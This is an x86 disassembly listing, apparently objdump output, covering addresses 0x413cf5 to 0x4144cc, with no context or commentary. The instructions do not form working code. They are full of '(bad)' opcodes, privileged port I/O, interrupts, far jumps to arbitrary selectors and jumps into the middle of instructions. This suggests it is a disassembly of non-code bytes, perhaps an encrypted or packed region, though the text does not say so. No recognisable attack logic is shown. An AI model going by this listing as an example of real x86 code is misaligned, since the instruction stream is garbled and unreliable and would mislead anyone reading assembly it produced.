  413cf5:	xor    DWORD PTR [ebp-0x74fce844],esi
  413cfb:	loope  0x413ca0
  413cfd:	sbb    eax,0xee72a5a4
  413d02:	xor    DWORD PTR [ebx-0x1f],0xffffffe5
  413d06:	lods   al,BYTE PTR ds:[esi]
  413d07:	inc    ebp
  413d08:	add    DWORD PTR [ebp+eax*2+0x7fc53821],ecx
  413d0f:	jne    0x413d72
  413d11:	out    0x66,eax
  413d13:	push   es
  413d14:	outs   dx,BYTE PTR ds:[esi]
  413d15:	push   esp
  413d16:	adc    al,0x43
  413d18:	mov    ebp,0xbc5f965
  413d1d:	adc    al,0x95
  413d1f:	lds    esp,FWORD PTR [ebp+0x76]
  413d22:	stos   BYTE PTR es:[edi],al
  413d23:	daa    
  413d24:	cmp    esp,DWORD PTR [edi-0xdf2790d]
  413d2a:	pusha  
  413d2b:	inc    ecx
  413d2c:	shl    BYTE PTR [esp+ebp*2-0x53623376],1
  413d33:	and    al,0x87
  413d35:	dec    esi
  413d36:	and    cl,BYTE PTR [esi-0x39]
  413d39:	outs   dx,BYTE PTR ds:[esi]
  413d3a:	or     eax,0xd2492673
  413d3f:	dec    eax
  413d40:	pop    eax
  413d41:	add    esi,0xffffff9f
  413d44:	jge    0x413db4
  413d46:	pop    esi
  413d47:	xchg   ebp,eax
  413d48:	xor    DWORD PTR ds:0x415f219c,0x31
  413d4f:	shr    BYTE PTR [ebp+0x716f2cf9],1
  413d55:	mov    cl,0xea
  413d57:	bound  ebx,QWORD PTR [ebp-0x636c3c6e]
  413d5d:	push   edx
  413d5e:	call   DWORD PTR [ebx-0x21]
  413d61:	test   DWORD PTR [bx+di],ebx
  413d64:	jbe    0x413d33
  413d66:	sub    esi,DWORD PTR [eax+eax*1+0x55]
  413d6a:	push   es
  413d6b:	xor    ah,BYTE PTR [eax]
  413d6d:	lock push ss
  413d6f:	and    eax,0xc922b82f
  413d74:	int    0x88
  413d76:	pusha  
  413d77:	outs   dx,BYTE PTR ds:[esi]
  413d78:	fisubr WORD PTR ds:0x1dcff4f9
  413d7e:	fmul   QWORD PTR [eax+edx*2-0x7e]
  413d82:	xchg   edx,eax
  413d83:	pop    edi
  413d84:	cwde   
  413d85:	pop    eax
  413d86:	hlt    
  413d87:	(bad)  [eax-0x49926043]
  413d8d:	fimul  DWORD PTR [edi-0x2a]
  413d90:	xchg   ebp,eax
  413d91:	mov    al,0x7e
  413d93:	xor    al,0xeb
  413d95:	add    BYTE PTR [ecx-0x1a],0x44
  413d99:	lock fwait
  413d9b:	pop    ss
  413d9c:	pop    edx
  413d9d:	aad    0xfe
  413d9f:	cmc    
  413da0:	jns    0x413d9d
  413da2:	sti    
  413da3:	or     al,0x24
  413da5:	outs   dx,BYTE PTR ds:[esi]
  413da6:	jmp    0x413d7f
  413da8:	fnsave [esi-0x6e7cf74d]
  413dae:	rcl    BYTE PTR [edi],0xad
  413db1:	in     al,dx
  413db2:	mov    cl,ah
  413db4:	ret    0x8de3
  413db7:	and    eax,0xc2aff693
  413dbc:	jo     0x413d70
  413dbe:	sub    eax,0x7871196d
  413dc3:	mov    edi,0x8832c81
  413dc8:	push   es
  413dc9:	xor    esp,DWORD PTR [edx]
  413dcb:	pop    ds
  413dcc:	lods   eax,DWORD PTR ds:[esi]
  413dcd:	xor    al,0xaf
  413dcf:	push   edi
  413dd0:	xchg   ecx,eax
  413dd1:	pop    esi
  413dd2:	push   eax
  413dd3:	jno    0x413e1b
  413dd5:	fdiv   DWORD PTR [ecx]
  413dd7:	std    
  413dd8:	(bad)  
  413dd9:	push   edi
  413dda:	je     0x413e21
  413ddc:	(bad)
  413ddf:	dec    eax
  413de0:	push   ds
  413de1:	stc    
  413de2:	into   
  413de3:	(bad)  
  413de4:	in     al,0xb
  413de6:	aas    
  413de7:	mov    eax,ds:0xf0007c39
  413dec:	add    cl,BYTE PTR [eax-0x6a43e064]
  413df2:	sub    al,0x23
  413df4:	cmp    ah,BYTE PTR [esp+edx*2]
  413df7:	sbb    esp,eax
  413df9:	inc    ecx
  413dfa:	mov    al,ds:0x45ef074a
  413dff:	and    al,0xbe
  413e01:	daa    
  413e02:	(bad)  
  413e03:	retf   
  413e04:	xor    eax,0x4173a2ec
  413e09:	pop    ecx
  413e0a:	sbb    DWORD PTR [ebp+ecx*8+0xe],ebx
  413e0e:	add    bh,BYTE PTR [esi-0x6c828755]
  413e14:	test   BYTE PTR ds:0x77f6fb7d,0xf8
  413e1b:	mov    edi,0xfc8eb4d5
  413e20:	(bad)  
  413e21:	(bad)  
  413e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e23:	stc    
  413e24:	push   esi
  413e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e26:	xlat   BYTE PTR ds:[ebx]
  413e27:	mov    bh,0x8a
  413e29:	inc    edi
  413e2a:	enter  0xdd60,0x74
  413e2e:	mov    ds:0xb2c4279f,al
  413e33:	es xor ebx,0x20
  413e37:	iret   
  413e38:	outs   dx,BYTE PTR ds:[esi]
  413e39:	xlat   BYTE PTR ds:[ebx]
  413e3a:	mov    bh,0xec
  413e3c:	pop    edi
  413e3d:	sti    
  413e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e3f:	add    esi,esi
  413e41:	add    edi,DWORD PTR [eax-0x78]
  413e44:	dec    edi
  413e45:	push   dx
  413e47:	repnz pushf 
  413e49:	rcr    BYTE PTR [edx+0x49af1935],cl
  413e4f:	xchg   ah,ch
  413e51:	push   ebx
  413e52:	mov    ds:0x463cd8f9,al
  413e57:	or     DWORD PTR [edx-0x30],eax
  413e5a:	mov    eax,ds:0x5d64de85
  413e5f:	jmp    0xac67:0x62575275
  413e66:	push   esp
  413e67:	jg     0x413e4f
  413e69:	(bad)
  413e6c:	xor    al,0x9c
  413e6e:	ins    DWORD PTR es:[edi],dx
  413e6f:	mov    ecx,0x1d9c995a
  413e74:	mov    DWORD PTR [ecx+0x47],ebx
  413e77:	xor    eax,0xcb0d1a2
  413e7c:	xor    eax,0x8d45a38b
  413e81:	sbb    DWORD PTR [edi+0x23],edi
  413e84:	call   0x8ad37987
  413e89:	adc    esp,DWORD PTR ds:0x5a3f5c03
  413e8f:	es xchg esi,edi
  413e92:	xchg   esp,eax
  413e93:	pop    edx
  413e94:	push   es
  413e95:	ret    0x23e2
  413e98:	outs   dx,BYTE PTR ds:[esi]
  413e99:	sahf   
  413e9a:	mov    eax,ds:0x28d0a2c
  413e9f:	ins    BYTE PTR es:[edi],dx
  413ea0:	imul   ebp,DWORD PTR [ebx],0x45
  413ea3:	(bad)  
  413ea4:	xchg   DWORD PTR [edx-0x6c],esi
  413ea7:	mov    esi,0x2c2f1104
  413eac:	jno    0x413eb1
  413eae:	popf   
  413eaf:	and    al,ch
  413eb1:	mov    dl,BYTE PTR ss:[eax-0x3d]
  413eb5:	arpl   dx,ax
  413eb7:	adc    ecx,DWORD PTR [eax-0x3d]
  413eba:	dec    eax
  413ebb:	shr    DWORD PTR [edi-0x1a],cl
  413ebe:	and    BYTE PTR [edi+0x5a2e4fe5],cl
  413ec4:	in     al,0xfe
  413ec6:	jg     0x413eb1
  413ec8:	in     eax,dx
  413ec9:	sahf   
  413eca:	call   0xd674:0x776fc2b2
  413ed1:	mov    edi,0x236a3841
  413ed6:	test   BYTE PTR [ebx],ah
  413ed8:	into   
  413ed9:	mov    esi,0x91def35a
  413ede:	dec    ebx
  413edf:	jb     0x413eca
  413ee1:	dec    BYTE PTR ds:0x91f62be0
  413ee7:	in     al,dx
  413ee8:	inc    edx
  413ee9:	scas   al,BYTE PTR es:[edi]
  413eea:	outs   dx,DWORD PTR ds:[esi]
  413eeb:	imul   edi,DWORD PTR [ebx+0x7c62b764],0x2a096a81
  413ef5:	(bad)  
  413ef6:	lock sbb al,0x59
  413ef9:	lods   al,BYTE PTR ds:[esi]
  413efa:	dec    esp
  413efb:	mov    dh,0xbc
  413efd:	push   0xffffffca
  413eff:	dec    esp
  413f00:	xor    DWORD PTR [esi+edx*1-0x1],esp
  413f04:	xor    BYTE PTR [ebp+0x426b7a05],cl
  413f0a:	add    bh,bh
  413f0c:	xor    cl,ch
  413f0e:	push   es
  413f0f:	add    eax,0x3dc40000
  413f14:	ror    ecx,cl
  413f16:	(bad)  
  413f18:	fidivr DWORD PTR ds:0x94ead996
  413f1e:	into   
  413f1f:	fisub  WORD PTR ds:0x7f1e567c
  413f25:	js     0x413f91
  413f27:	jl     0x413fa1
  413f29:	js     0x413ec8
  413f2b:	aad    0xa3
  413f2d:	popa   
  413f2e:	add    al,0xeb
  413f30:	add    dh,bl
  413f32:	dec    edi
  413f33:	hlt    
  413f34:	stos   BYTE PTR es:[edi],al
  413f35:	and    eax,0x126ff5b3
  413f3a:	dec    ebx
  413f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f3d:	xchg   DWORD PTR [esi+esi*1],edx
  413f40:	cmp    dl,ch
  413f42:	mov    ebx,0x74f9bad3
  413f47:	jmp    0x413f1c
  413f49:	adc    dh,BYTE PTR [ebp+ecx*2+0x2c]
  413f4d:	push   cs
  413f4e:	out    dx,al
  413f4f:	pop    ebp
  413f50:	push   ebx
  413f51:	rcl    DWORD PTR [esi-0x7b],1
  413f54:	pop    edx
  413f55:	inc    edi
  413f56:	inc    ebp
  413f57:	or     eax,0x72d28bcd
  413f5c:	lods   eax,DWORD PTR ds:[esi]
  413f5d:	outs   dx,DWORD PTR ds:[esi]
  413f5e:	xor    eax,0xc647923a
  413f63:	pop    ebx
  413f64:	leave  
  413f65:	or     bl,bl
  413f67:	(bad)  
  413f69:	fsub   st,st(1)
  413f6b:	adc    al,0x67
  413f6d:	cld    
  413f6e:	xlat   BYTE PTR ds:[ebx]
  413f6f:	test   eax,0x88f1d8b9
  413f74:	fst    DWORD PTR [eax+0x2c]
  413f77:	inc    ebp
  413f78:	mov    edx,0x11bce210
  413f7d:	or     al,0x1c
  413f7f:	pushf  
  413f80:	lahf   
  413f81:	sub    eax,0x2d87d7ad
  413f86:	inc    esp
  413f87:	gs iret 
  413f89:	add    ebx,esi
  413f8b:	pop    es
  413f8c:	in     eax,0x27
  413f8e:	mov    ds,ebx
  413f90:	mov    eax,0x1b692bf0
  413f95:	arpl   WORD PTR [ebp-0x9],bx
  413f98:	enter  0xb891,0xeb
  413f9c:	cmp    ecx,DWORD PTR [eax+eiz*8+0x3afbbe05]
  413fa3:	std    
  413fa4:	sub    DWORD PTR [esi-0x14],eax
  413fa7:	int    0x41
  413fa9:	test   al,0xfe
  413fab:	repz imul esi,DWORD PTR [ebp+0x32],0xffffffd1
  413fb0:	xchg   DWORD PTR [edi+0x2cb2ad4d],ebp
  413fb6:	mov    DWORD PTR [ebp+0x347629c],ecx
  413fbc:	and    eax,DWORD PTR [edx-0x40]
  413fbf:	cli    
  413fc0:	jne    0x413f4a
  413fc2:	js     0x414013
  413fc4:	repz push ss
  413fc6:	dec    edi
  413fc7:	jmp    0x413f89
  413fc9:	dec    esp
  413fca:	cmp    ecx,ebp
  413fcc:	fsubr  QWORD PTR [esi-0x126ca685]
  413fd2:	mov    esp,0xbf5fe12
  413fd7:	mov    al,ds:0xdf51adc
  413fdc:	dec    ebp
  413fdd:	inc    edx
  413fde:	js     0x413f86
  413fe0:	out    dx,al
  413fe1:	shr    BYTE PTR [ebp+0x6af59110],0xde
  413fe8:	sbb    BYTE PTR [esi-0x6d],dl
  413feb:	call   0xd1ab177e
  413ff0:	outs   dx,DWORD PTR ds:[esi]
  413ff1:	sbb    BYTE PTR [eax],ah
  413ff3:	stos   DWORD PTR es:[edi],eax
  413ff4:	cmp    cl,BYTE PTR [edx+esi*1-0x28b39d34]
  413ffb:	sbb    DWORD PTR es:[ebp+0x26ece4ee],0x71
  414003:	(bad)  
  414004:	(bad)  
  414005:	mov    ecx,0x5751aeb8
  41400a:	pop    eax
  41400b:	mov    esp,DWORD PTR [ebx+ebx*2]
  41400e:	xchg   ebx,eax
  41400f:	fsub   QWORD PTR [edx-0x45]
  414012:	push   es
  414013:	mov    BYTE PTR [eax+0x27],bh
  414016:	push   edi
  414017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414018:	mov    ebx,ebx
  41401a:	mov    eax,ds:0x12c7a385
  41401f:	(bad)  
  414020:	cli    
  414021:	push   esi
  414022:	add    ebp,DWORD PTR [edx]
  414024:	mov    eax,DWORD PTR [edx-0x78]
  414027:	loopne 0x413ff0
  414029:	xor    DWORD PTR [ebx-0x32],ecx
  41402c:	mov    bh,0xff
  41402e:	dec    ebx
  41402f:	lahf   
  414030:	inc    ecx
  414031:	adc    al,0x6f
  414033:	popa   
  414034:	jmp    0x414023
  414036:	aam    0xb8
  414038:	jl     0x413fc6
  41403a:	jp     0x413feb
  41403c:	aas    
  41403d:	aam    0xde
  41403f:	fwait
  414040:	test   DWORD PTR [ecx+esi*2-0x6c],0x88d2ef4a
  414048:	push   ds
  414049:	mov    ebp,DWORD PTR [esp+ecx*1]
  41404c:	push   ds
  41404d:	xchg   ebx,eax
  41404e:	arpl   WORD PTR [ecx-0x43e67f45],ax
  414054:	push   ebx
  414055:	fiadd  WORD PTR [ebp+0x49e5a032]
  41405b:	and    BYTE PTR [edi-0x6f],0xd7
  41405f:	mov    ebp,0x1b5446db
  414064:	sub    edx,DWORD PTR [edx+0x53c68c4b]
  41406a:	mov    BYTE PTR [edi],ch
  41406c:	retf   
  41406d:	jecxz  0x414029
  41406f:	mov    BYTE PTR [eax+0x68],cl
  414072:	and    cl,BYTE PTR [ebx]
  414074:	mov    BYTE PTR [ecx+esi*2-0x98606d],ah
  41407b:	in     eax,0x33
  41407d:	fbld   TBYTE PTR [ebp-0x78]
  414080:	retf   
  414081:	int3   
  414082:	cmp    DWORD PTR [ebx+eax*2-0x4bdeb68d],edi
  414089:	lahf   
  41408a:	sti    
  41408b:	in     al,dx
  41408c:	jmp    0x41405c
  41408e:	inc    esp
  41408f:	lock adc edi,DWORD PTR [eax-0x1d]
  414093:	adc    DWORD PTR [ebx-0x3b],edi
  414096:	sbb    eax,0xf8df6890
  41409b:	pop    eax
  41409c:	test   al,0xb4
  41409e:	inc    esp
  41409f:	js     0x41403b
  4140a1:	add    al,0x9e
  4140a3:	fst    DWORD PTR [ebp+esi*4-0x47089cc9]
  4140aa:	mov    al,0xf3
  4140ac:	rcl    BYTE PTR [edi],1
  4140ae:	loopne 0x4140d0
  4140b0:	dec    ebp
  4140b1:	(bad)
  4140b5:	ins    DWORD PTR es:[edi],dx
  4140b6:	xchg   edi,eax
  4140b7:	test   eax,0x5487ff2
  4140bc:	add    eax,0x677b5947
  4140c1:	or     dh,BYTE PTR [edx]
  4140c3:	je     0x414049
  4140c5:	or     al,dh
  4140c7:	push   ecx
  4140c8:	bound  ebx,QWORD PTR [esi+0xe]
  4140cb:	push   eax
  4140cc:	lods   al,BYTE PTR ds:[esi]
  4140cd:	dec    edi
  4140ce:	and    BYTE PTR [eax+0x2c5c6b72],dl
  4140d4:	pusha  
  4140d5:	call   0x81b8:0xf4a34d94
  4140dc:	jecxz  0x4140e6
  4140de:	cmp    al,0xdb
  4140e0:	mov    bh,0x3a
  4140e2:	or     ah,BYTE PTR [eax+0x71a72888]
  4140e8:	aas    
  4140e9:	mov    es,WORD PTR [ebx+0xf]
  4140ec:	xchg   BYTE PTR ds:0x53d6da5d,ah
  4140f2:	cmp    cl,BYTE PTR [eax-0x10]
  4140f5:	xor    ebx,ebp
  4140f7:	packssdw mm4,mm2
  4140fa:	mov    ebp,0x6ed24ca1
  4140ff:	cli    
  414100:	cmp    eax,esp
  414102:	arpl   WORD PTR [ecx],ax
  414104:	dec    ebx
  414105:	neg    DWORD PTR [esi+0x69]
  414108:	pop    es
  414109:	mov    edx,DWORD PTR ss:[esi+0x4c]
  41410d:	ret    
  41410e:	inc    ebx
  41410f:	stos   DWORD PTR es:[edi],eax
  414110:	xchg   DWORD PTR es:[ebx+esi*1+0x39],ebp
  414115:	mov    ebx,0xaaf2180d
  41411a:	jmp    0xfac304eb
  41411f:	push   esi
  414120:	dec    ebx
  414121:	cmp    al,0xc2
  414123:	sbb    BYTE PTR [esi],bh
  414125:	ja     0x41414d
  414127:	pop    eax
  414128:	xchg   BYTE PTR [esi],bh
  41412a:	ins    BYTE PTR es:[edi],dx
  41412b:	repnz dec ecx
  41412d:	test   DWORD PTR [edi],0x7257ec8f
  414133:	mov    dh,0x94
  414135:	jne    0x4140d7
  414137:	jle    0x414129
  414139:	mov    al,0x6f
  41413b:	sub    bh,BYTE PTR [ebx-0x69]
  41413e:	xor    al,0x8d
  414140:	mov    eax,ds:0x38e5e988
  414145:	mov    ebx,0xb29e0309
  41414a:	jbe    0x414119
  41414c:	jecxz  0x4141b0
  41414e:	sar    ch,0xf3
  414151:	xchg   ebp,eax
  414152:	stos   BYTE PTR es:[edi],al
  414153:	push   edi
  414154:	adc    al,0x71
  414156:	lock inc eax
  414158:	rcr    BYTE PTR [edx-0x3836a83],0x97
  41415f:	push   ss
  414160:	mov    DWORD PTR [edx],ebx
  414162:	mov    esp,0xb6526cf4
  414167:	popf   
  414168:	js     0x41413b
  41416a:	mov    WORD PTR [eax],gs
  41416c:	xchg   esp,eax
  41416d:	push   ebx
  41416e:	sbb    al,bl
  414170:	ror    BYTE PTR [esi+eax*8],1
  414173:	stc    
  414174:	and    bh,dh
  414176:	dec    ecx
  414177:	jle    0x41412a
  414179:	mov    edi,0x99311cfc
  41417e:	dec    ebx
  41417f:	adc    al,0x49
  414182:	pop    ds
  414183:	pusha  
  414184:	mov    edi,0x3ce30d10
  414189:	xchg   esi,eax
  41418a:	cld    
  41418b:	dec    eax
  41418c:	test   BYTE PTR [edi],ah
  41418e:	xchg   esp,eax
  41418f:	fstp   QWORD PTR [eax-0x80]
  414192:	pop    esi
  414193:	sub    BYTE PTR [eax-0x57634ed1],cl
  414199:	cmp    cl,bl
  41419b:	or     bh,dl
  41419d:	adc    al,0x37
  41419f:	mov    eax,ds:0x5481c5ad
  4141a4:	aam    0x36
  4141a6:	pop    ecx
  4141a7:	in     al,0x14
  4141a9:	cmp    al,0x85
  4141ab:	lods   eax,DWORD PTR ds:[esi]
  4141ac:	push   cs
  4141ad:	inc    edx
  4141ae:	ss mov esp,esp
  4141b1:	adc    ecx,DWORD PTR [ecx]
  4141b3:	(bad)  
  4141b7:	mov    cl,0xc3
  4141b9:	daa    
  4141ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141bb:	inc    edi
  4141bc:	neg    DWORD PTR gs:[edi-0x2a379636]
  4141c3:	sub    edi,edx
  4141c5:	jae    0x41423e
  4141c7:	and    edx,DWORD PTR [ebp-0x23f5e7fb]
  4141cd:	aad    0xb5
  4141cf:	outs   dx,BYTE PTR ds:[esi]
  4141d0:	retf   
  4141d1:	popa   
  4141d2:	pop    edx
  4141d3:	mov    eax,ds:0x7e8fb3e
  4141d8:	cdq    
  4141d9:	nop
  4141da:	push   ebx
  4141db:	xchg   edi,eax
  4141dc:	jno    0x4141ad
  4141de:	jle    0x414173
  4141e0:	push   eax
  4141e1:	repz daa 
  4141e3:	xor    cl,BYTE PTR [edx+0x65]
  4141e6:	fisttp WORD PTR ds:0xf1e54de2
  4141ec:	rol    BYTE PTR [edx-0x3b],0x18
  4141f0:	push   ss
  4141f1:	dec    DWORD PTR [ebx+0x5b95114d]
  4141f7:	pop    ebp
  4141f8:	or     eax,0x620af849
  4141fd:	jno    0x4141c1
  4141ff:	cmp    cl,BYTE PTR [eax+edx*2+0x25]
  414203:	add    DWORD PTR [ecx],0x9ff162b4
  414209:	pop    esp
  41420a:	jnp    0x4141f7
  41420c:	gs push esi
  41420e:	mov    BYTE PTR [esp+esi*2],al
  414211:	xchg   ecx,eax
  414212:	or     ah,ah
  414214:	xchg   bl,ah
  414216:	cmc    
  414217:	in     al,dx
  414218:	adc    BYTE PTR [eax+0x42],0xc0
  41421c:	in     eax,dx
  41421d:	test   eax,0xc6208966
  414222:	inc    eax
  414223:	jo     0x41429c
  414225:	out    0x18,eax
  414227:	out    0x1,al
  414229:	fadd   DWORD PTR [ebx-0x3c2b0d2b]
  41422f:	and    ebx,DWORD PTR [esp+edi*8]
  414232:	popa   
  414233:	sbb    BYTE PTR [esi],cl
  414235:	jno    0x41428e
  414237:	pop    ebp
  414238:	sbb    al,0x9d
  41423a:	fld    st(7)
  41423c:	loop   0x414207
  41423e:	push   ebx
  41423f:	gs xor al,0x12
  414242:	jge    0x4142b9
  414244:	sar    edi,cl
  414246:	popf   
  414247:	pop    esi
  414248:	sahf   
  414249:	jg     0x4142af
  41424b:	neg    BYTE PTR [ecx+0x86d2746]
  414251:	pop    es
  414252:	aad    0x69
  414254:	outs   dx,DWORD PTR ds:[esi]
  414255:	ret    0xecf6
  414258:	imul   esp,DWORD PTR [edx-0xeda31cf],0xffffffff
  41425f:	fsub   QWORD PTR [esp+edx*4-0x80]
  414263:	stc    
  414264:	mov    dl,0x7
  414266:	sub    ebx,ecx
  414268:	cmp    DWORD PTR [ebp+0x5d],eax
  41426b:	daa    
  41426c:	push   edx
  41426d:	pop    ebp
  41426e:	xchg   ecx,eax
  41426f:	es lock push ss
  414272:	in     al,0xd9
  414274:	jbe    0x41422b
  414276:	aad    0x57
  414278:	je     0x4142b5
  41427a:	push   esp
  41427b:	sbb    ebx,DWORD PTR [ebx+0x73]
  41427e:	repnz stos DWORD PTR es:[edi],eax
  414280:	cmp    dh,BYTE PTR [ecx]
  414282:	gs pop esi
  414284:	(bad)  
  414285:	inc    BYTE PTR [edi+0x46]
  414288:	mov    BYTE PTR [eax],dl
  41428a:	mov    eax,ds:0xcc809d51
  41428f:	jle    0x414305
  414291:	test   BYTE PTR [ebx],cl
  414293:	mov    al,0xe2
  414295:	ja     0x41422e
  414297:	push   ecx
  414298:	pop    ebp
  414299:	je     0x4142fe
  41429b:	xor    eax,0xd5a844de
  4142a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a1:	leave  
  4142a2:	ret    0xdd15
  4142a5:	sub    ch,dh
  4142a7:	push   ecx
  4142a8:	cmc    
  4142a9:	fcmovnu st,st(1)
  4142ab:	inc    edx
  4142ac:	and    bh,BYTE PTR [eax+esi*8]
  4142af:	sbb    eax,0x6548009b
  4142b4:	or     eax,0x68fe7107
  4142b9:	out    0x75,al
  4142bb:	scas   al,BYTE PTR es:[edi]
  4142bc:	add    ecx,edx
  4142be:	iret   
  4142bf:	and    ebx,DWORD PTR [eax-0x3f]
  4142c2:	inc    ebx
  4142c3:	mov    edi,0x90ba999f
  4142c8:	push   ecx
  4142c9:	adc    BYTE PTR [edi+edi*8],ah
  4142cc:	cmp    al,0x35
  4142ce:	xchg   edx,eax
  4142cf:	lahf   
  4142d0:	jno    0x4142df
  4142d2:	jmp    0x55d9c9e4
  4142d7:	xchg   ecx,eax
  4142d8:	mov    bl,0x19
  4142da:	lods   al,BYTE PTR ds:[esi]
  4142db:	mov    ds:0x303783b3,eax
  4142e0:	jmp    0x28fda308
  4142e5:	and    esp,DWORD PTR [ecx]
  4142e7:	and    BYTE PTR [ebp-0x48dee980],bl
  4142ed:	into   
  4142ee:	mov    cl,dh
  4142f0:	hlt    
  4142f1:	addr16 (bad) 
  4142f3:	stc    
  4142f4:	pop    ebx
  4142f5:	adc    DWORD PTR fs:[esi],esp
  4142f8:	xchg   ebp,eax
  4142f9:	int    0x55
  4142fb:	jmp    0x8a4e:0x2e970ae9
  414302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414303:	mov    esp,0x8b044859
  414308:	pop    ecx
  414309:	cmp    eax,0x7ca3bd73
  41430e:	shl    DWORD PTR [ebx-0x33e57ac7],1
  414314:	sbb    BYTE PTR [eax-0x47],bh
  414317:	mov    al,ds:0x11f078da
  41431c:	out    0x60,al
  41431e:	mov    al,0x83
  414320:	lds    edi,FWORD PTR [eax-0x6d]
  414323:	mov    BYTE PTR [ecx-0x5d],cl
  414326:	stc    
  414327:	fst    DWORD PTR [eax]
  414329:	push   0xffffffad
  41432b:	mov    ah,dh
  41432d:	jmp    0x414375
  41432f:	in     eax,0xec
  414331:	test   eax,0xaafd401b
  414336:	in     eax,0xdd
  414338:	inc    ecx
  414339:	cs inc esp
  41433b:	dec    esp
  41433c:	out    0xd6,eax
  41433e:	push   ebx
  41433f:	mov    ds:0x9bacba93,eax
  414344:	loopne 0x41438d
  414346:	inc    edx
  414347:	mov    cl,0x95
  414349:	dec    ecx
  41434a:	rol    ecx,0x56
  41434d:	inc    ebx
  41434e:	adc    eax,0xc3bca09e
  414353:	add    DWORD PTR [esi],0xffffffb8
  414356:	retf   
  414357:	test   BYTE PTR [ecx-0x75ed3b61],cl
  41435d:	sbb    DWORD PTR [esi+0x35],esi
  414360:	sbb    al,0xa3
  414362:	mov    dl,0x24
  414364:	sub    DWORD PTR [edx-0x48f8e363],ebx
  41436a:	pop    edi
  41436b:	mov    ds:0xb97dd364,al
  414370:	or     edi,ecx
  414372:	mov    bh,0x9
  414374:	cmp    edx,DWORD PTR [eax-0x31246316]
  41437a:	fcmovnb st,st(1)
  41437c:	int    0xdb
  41437e:	inc    ebx
  41437f:	shl    DWORD PTR [esi+ebx*8-0x1dbd9a32],cl
  414386:	pop    ss
  414387:	sub    BYTE PTR [ebx+0x6c],dl
  41438a:	sar    BYTE PTR [edx+0x5e4427a8],1
  414390:	push   es
  414391:	mov    dh,al
  414393:	loop   0x414358
  414395:	shr    DWORD PTR [edi],cl
  414397:	mov    ?,WORD PTR [edx+0x249a39aa]
  41439d:	cmp    al,0xe8
  41439f:	rol    BYTE PTR [ebx+0x3c],cl
  4143a2:	sbb    eax,0x2153bcd
  4143a7:	dec    edx
  4143a8:	int3   
  4143a9:	je     0x4143fe
  4143ab:	xchg   edi,eax
  4143ac:	jmp    0x5178:0x1c3ac835
  4143b3:	mov    ecx,0xb47b901f
  4143b8:	mov    BYTE PTR [edi+0x196660f6],dl
  4143be:	push   cs
  4143bf:	fld    TBYTE PTR [eax+eax*1+0x47ee8a1a]
  4143c6:	(bad)  
  4143c7:	ins    BYTE PTR es:[edi],dx
  4143c8:	fs pusha 
  4143ca:	in     al,0x22
  4143cc:	ds retf 
  4143ce:	mov    BYTE PTR [ebp*4-0x6c47d850],bh
  4143d5:	test   al,0xe8
  4143d7:	jle    0x4143f8
  4143d9:	data16 xor BYTE PTR [eax],dl
  4143dc:	mov    al,ds:0x53d29913
  4143e1:	(bad)  
  4143e2:	aam    0x46
  4143e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143e5:	stos   BYTE PTR es:[edi],al
  4143e6:	lea    ecx,[esi+ecx*4+0x63]
  4143ea:	stos   BYTE PTR es:[edi],al
  4143eb:	mov    ch,0xab
  4143ed:	mov    ebp,0x5cc2ffb5
  4143f2:	jle    0x4143d5
  4143f4:	into   
  4143f5:	or     ebp,DWORD PTR [ebx+0x5a]
  4143f8:	jge    0x41439f
  4143fa:	fdivr  DWORD PTR ds:0xe27dc217
  414400:	mov    ds:0x63598f4,eax
  414405:	xchg   al,ah
  414407:	pop    esp
  414408:	add    DWORD PTR [esi+ebx*4-0x2f5fa1d9],ecx
  41440f:	push   eax
  414410:	data16 mov ds:0x974cd2cd,al
  414416:	push   ebp
  414417:	and    al,0x8d
  414419:	add    eax,0x426c2a
  41441e:	push   DWORD PTR [eax]
  414420:	jmp    0x41492b
  414425:	(bad)  
  414426:	retf   0xd3ca
  414429:	leave  
  41442a:	rcl    ebp,cl
  41442c:	fcmovb st,st(7)
  41442e:	sub    DWORD PTR [edi+0x1e38678c],ecx
  414434:	ins    BYTE PTR es:[edi],dx
  414435:	inc    eax
  414436:	and    DWORD PTR [edi+0x78],edi
  414439:	push   0x7c
  41443b:	js     0x4144b5
  41443d:	add    eax,0xd895ec49
  414442:	mov    ds:0x3aff1cb0,al
  414447:	mov    al,0x2f
  414449:	dec    esi
  41444a:	inc    ecx
  41444b:	cli    
  41444c:	mov    es,ebx
  41444e:	imul   esp,DWORD PTR [ebp-0x456fc2a5],0x12d7a78b
  414458:	stc    
  414459:	repz sub ebp,DWORD PTR [edx+0x2c35fa2f]
  414460:	lea    ebx,[esi+0x432a5e84]
  414466:	lods   al,BYTE PTR ds:[esi]
  414467:	mov    esi,0x6f117717
  41446c:	push   ebx
  41446d:	bound  esp,QWORD PTR [edi]
  41446f:	mov    ah,0x1a
  414471:	or     ebp,DWORD PTR [esi*4+0x4b268d42]
  414478:	mov    cl,al
  41447a:	push   ss
  41447b:	nop
  41447c:	cdq    
  41447d:	dec    edx
  41447e:	add    BYTE PTR [esi+0x5b5ed81d],dh
  414484:	mov    WORD PTR [esi],?
  414486:	sub    BYTE PTR [ebx-0x14f25aa2],0xb6
  41448d:	(bad)  
  41448e:	fild   WORD PTR [eax+0x7c4d1312]
  414494:	adc    eax,0x4f0a6ca
  414499:	or     DWORD PTR [ecx-0x59b6f7d],edx
  41449f:	repz test DWORD PTR ds:0x50eaeca9,eax
  4144a6:	sbb    BYTE PTR ds:0x2911adf3,ch
  4144ac:	ds mov ss,ecx
  4144af:	mov    ch,0xe5
  4144b1:	fimul  WORD PTR [edx-0x33f10973]
  4144b7:	scas   al,BYTE PTR es:[edi]
  4144b8:	jg     0x414449
  4144ba:	xchg   ecx,eax
  4144bb:	fs mov ah,0x11
  4144be:	xor    BYTE PTR [eax+0x26bd14f3],dh
  4144c4:	in     eax,dx
  4144c5:	mov    esi,ebx
  4144c7:	arpl   WORD PTR [edi],ax
  4144c9:	imul   edx,DWORD PTR [ecx],0xffffffcf
  4144cc:	sbb    DWORD PTR [esp+esi*2],ebx
